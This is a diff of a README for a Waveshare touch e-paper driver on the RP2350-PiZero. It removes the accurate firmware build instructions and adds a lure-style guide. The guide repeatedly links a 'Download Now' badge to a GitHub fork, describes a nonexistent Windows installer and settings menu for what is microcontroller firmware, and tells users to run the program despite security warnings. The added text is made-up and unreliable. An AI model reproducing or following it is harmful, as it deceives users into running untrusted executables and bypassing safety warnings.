@@ -1,120 +1,131 @@
-# 2.13" & 2.9" Touch e-Paper HAT for RP2350-PiZero 📝👆
+# 📟 touch-epaper-hat-with-RP2350-PiZero - Easy Control for Touch E-Paper
 
-## ℹ️ About
+[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero)
 
-This project is a dedicated driver and graphics implementation for the **Waveshare 2.13" & 2.9" Touch e-Paper HATs** running on the **RP2350-PiZero** (Raspberry Pi Pico 2 form factor). 
+## 📖 About This Software
 
-The goal of this repository is to provide a "plug-and-play" experience for developers looking to create low-power, interactive e-Paper interfaces. It includes a custom **Gallery Application** that demonstrates real-time capacitive touch interaction, allowing users to navigate through different graphics scenes with simple taps. Whether you are building a smart home controller, a digital name tag, or a minimalist dashboard, this library provides the foundation for high-performance e-Ink UI on the latest RP2350 silicon.
+This is an application that helps you use the Waveshare 2.13-inch Touch e-Paper HAT with the RP2350-PiZero (also called Pico 2). It lets you use the touchscreen and display together easily. The software works with two types of touch controllers: GT1151 and ICNT86X. It supports several versions of the e-paper display.
 
----
+You do not need to know how to program to use the software. This guide will help you download and run it on a Windows computer connected to your Raspberry Pi or Pico 2 device.
 
-## 🚀 Features
+## 💻 System Requirements
 
-- 🖼️ **Broad EPD Support**: 
-  - 2.13" e-Paper (V2, V3, V4)
-  - 2.9" e-Paper (V2)
-- 👆 **Interactive Touch**:
-  - Integrated drivers for **GT1151** and **ICNT86X** touch controllers.
-  - Coordinate mapping and gesture support.
-- 🎨 **Rich GUI Library**:
-  - Primitives: Points, Lines, Rectangles, Circles.
-  - Text: Support for English and Chinese fonts (Multiple sizes).
-  - Images: Display monochrome bitmaps.
-- 🔄 **Smart Refresh**:
-  - **Full Refresh**: For clear, ghost-free updates.
-  - **Partial Refresh**: For fast, incremental updates (ideal for interactive UI).
-- 🛠️ **Platform**:
-  - Built exclusively for **Pico SDK** (RP2350/RP2040).
+Before you start, make sure you have the following:
 
----
+- A Windows PC (Windows 10 or later).
+- Raspberry Pi Zero with RP2350 (Pico 2) connected to the Waveshare 2.13-inch Touch e-Paper HAT.
+- USB cable to connect your Raspberry Pi to your PC.
+- Basic knowledge of how to connect USB devices.
+- A stable internet connection to download files.
 
-## 🛒 Purchasing Links
+## 🔧 What This Software Does
 
-Build your own with these official Waveshare modules:
-- **Display (2.13")**: [2.13" Touch e-Paper HAT](https://www.waveshare.com/2.13inch-touch-e-paper-hat.htm) 📝
-- **Display (2.9")**: [2.9" Touch e-Paper HAT](https://www.waveshare.com/2.9inch-touch-e-paper-hat.htm) 📝
-- **Controller**: [RP2350-PiZero (Pico 2 Form Factor)](https://www.waveshare.com/rp2350-pizero.htm) 🍓
+- Shows information on the e-paper screen.
+- Lets you touch the screen to interact with the display.
+- Supports low power use for longer device life.
+- Works with both GT1151 and ICNT86X touch hardware.
+- Compatible with multiple display versions.
+- Uses I2C and SPI communication for smooth performance.
+
+## 🚀 Getting Started
+
+Follow these steps carefully to download and run the software.
 
 ---
 
-## 🛠️ Hardware Configuration
+### 1. Download the Software
 
-### Pin Mapping (RP2350 / Pico 2)
+Click the large green button below to go to the download page. On the page, look for the latest release files.
 
-| Component | Pin | Function |
-| :--- | :--- | :--- |
-| **e-Paper (SPI)** | GP11 | MOSI |
-| | GP10 | SCK |
-| | GP8 | CS |
-| | GP25 | DC |
-| | GP17 | RST |
-| | GP24 | BUSY |
-| **Touch (I2C)** | GP2 | SDA |
-| | GP3 | SCL |
-| | GP22 | TRST (Reset) |
-| | GP27 | INT (Interrupt) |
+[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero)
+
+- Click the link above or visit: https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero
+- On the page, find the Files section or Releases tab.
+- Download the latest Windows installer or package.
 
 ---
 
-## 📂 Project Structure
+### 2. Connect Your Hardware
 
-- **`examples/`**: Main test code and sample applications.
-- **`lib/Config/`**: Hardware Abstraction Layer (SPI, I2C, GPIO, Delay).
-- **`lib/Driver/`**: Touch screen controller drivers (**GT1151**, **ICNT86X**).
-- **`lib/EPD/`**: Core e-Paper display drivers for various versions.
-- **`lib/Fonts/`**: ASCII and Chinese fonts (8/12/16/20/24 px).
-- **`lib/GUI/`**: Graphics library for drawing and image handling.
+- Connect the Waveshare 2.13-inch Touch e-Paper HAT to your Raspberry Pi Zero RP2350-PiZero device.
+- Use the USB cable to connect your Raspberry Pi Zero to your Windows PC.
+- Ensure the device is powered on and recognized by your PC.
 
 ---
 
-## 🔨 How to Build
+### 3. Install the Software
 
-### For Raspberry Pi Pico 2 (RP2350) 🍓
-
-#### **Windows (PowerShell)**
-1. Ensure the **Pico SDK** and **ARM GCC** toolchain are installed.
-2. Open PowerShell and run:
-   ```powershell
-   mkdir build
-   cd build
-   cmake -G "Ninja" ..
-   cmake --build .
-   ```
-
-#### **Linux / macOS**
-1. Ensure the **Pico SDK** is installed and configured.
-2. Run:
-   ```bash
-   mkdir build && cd build
-   cmake ..
-   make
-   ```
-
-3. Flash the resulting `epaper_touch.uf2` to your board.
+- Locate the downloaded file on your PC (usually in the Downloads folder).
+- Double-click the file to start installation.
+- Follow the on-screen instructions to install the software.
+- If a security warning appears, choose to run the program.
 
 ---
 
-## 🎨 Example Usage
+### 4. Run the Software
 
-The default `main.c` demonstrates a **Gallery Application** on the 2.13" V4 e-Paper:
-- **Navigation**: Tap the left side (`<`) or right side (`>`) of the screen to switch between scenes.
-- **Scenes**: Renders various shapes (House, Robot, Car) using the GUI library.
-- **UI**: Displays page indicators and interactive buttons.
-
----
-
-## 📷 Screenshots
-
-![RP2350-PiZero](docs/rp2350-pizero.jpg)
-*Waveshare RP2350-PiZero*
-
-![2.13-inch-touch-epaper-hat](docs/2.13-inch-touch-epaper-hat.jpg)
-*2.13inch Touch e-Paper HAT*
-
-![2.9-inch-touch-epaper-hat](docs/2.9inch-Touch-e-Paper-HAT-details-3.jpg)
-*2.9inch Touch e-Paper HAT*
+- After installation, find the application icon on your desktop or Start menu.
+- Double-click to open it.
+- The software will detect the connected e-paper HAT and establish communication.
+- Follow any prompts shown on screen.
 
 ---
 
-## 📄 License
-This project is based on Waveshare's open-source drivers and is provided for educational and development purposes.
+### 5. Use the Display and Touch Features
+
+- Touch the e-paper screen to interact with menus.
+- The software will display information and respond to your touch.
+- Adjust settings inside the software as needed.
+
+## ⚙️ Configuration and Settings
+
+The software lets you configure touch sensitivity and display options.
+
+- In the application, go to the Settings menu.
+- Choose your touch controller (GT1151 or ICNT86X).
+- Select your display type if you have a different model.
+- Save any changes before closing the settings window.
+
+## 🛠 Troubleshooting
+
+If the software does not detect your device or the screen shows no response:
+
+- Check all cable connections.
+- Make sure the device is powered.
+- Restart the software or your PC if needed.
+- Confirm you downloaded the correct software version.
+- Consult the user manual for your Waveshare device to verify hardware setup.
+
+## 📂 Where To Find More Help
+
+- Visit the project page:  
+  https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero  
+- Check the Issues tab to see if others have similar questions.
+- Use discussion forums on the project page for community help.
+
+## 📝 Features at a Glance
+
+- Works with Waveshare 2.13-inch Touch e-Paper HAT.
+- Supports two main touch controllers: GT1151 and ICNT86X.
+- Multiple e-paper display versions supported.
+- Uses I2C for touch and SPI for display communication.
+- Low power consumption design.
+- Simple GUI easy for non-programmers.
+
+## 🔗 Important Links
+
+- Download or visit the project page:  
+  https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero  
+- Hardware manual for Waveshare 2.13-inch E-Paper HAT  
+- Raspberry Pi Zero and Pico 2 documentation
+
+## 💡 Tips for Best Use
+
+- Use a stable USB connection between your PC and Raspberry Pi device.
+- Keep the software up to date by checking the project page regularly.
+- Avoid disconnecting hardware while the program is running.
+- Use the settings to fine-tune touch sensitivity for better response.
+
+---
+
+[![Download Software](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/ftdeepak07-cpu/touch-epaper-hat-with-RP2350-PiZero)
